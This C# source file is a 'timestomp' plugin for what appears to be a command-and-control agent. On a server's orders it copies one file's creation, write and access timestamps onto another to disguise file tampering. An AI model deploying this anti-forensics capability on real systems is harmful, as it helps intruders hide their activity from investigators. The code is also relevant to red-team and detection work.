using System.Text;
using Agent.Interfaces;
using Agent.Models;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "timestomp";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            string response = String.Empty;
            TimeStompArgs args = JsonSerializer.Deserialize<TimeStompArgs>(job.task.parameters);
            
            
            if(!args.Validate(out response))
            {
                await messageManager.Write(response, job.task.id, true, "error");
            }

            //StringBuilder sb = new StringBuilder();
            try
            {
                DateTime ct = File.GetCreationTime(args.source);
                DateTime lwt = File.GetLastWriteTime(args.source);
                DateTime lat = File.GetLastAccessTime(args.source);

                File.SetCreationTime(args.destination, ct);
                File.SetLastWriteTime(args.destination, lwt);
                File.SetLastAccessTime(args.destination, lat);

                response = $"""
                    Time attributes applied to{args.destination}
                        Creation Time: {ct}
                        Last Write Time: {lwt}
                        Last access Time: {lat}
                 """;
            }
            catch (Exception e)
            {
                response = $"Failed to timestomp: {args.destination} {e.ToString()}";
                //sb.AppendFormat("Could not timestomp {0}: {1}", args.destination, e.ToString()).AppendLine();
            }

            await messageManager.Write(response, job.task.id, true);
        }
    }
}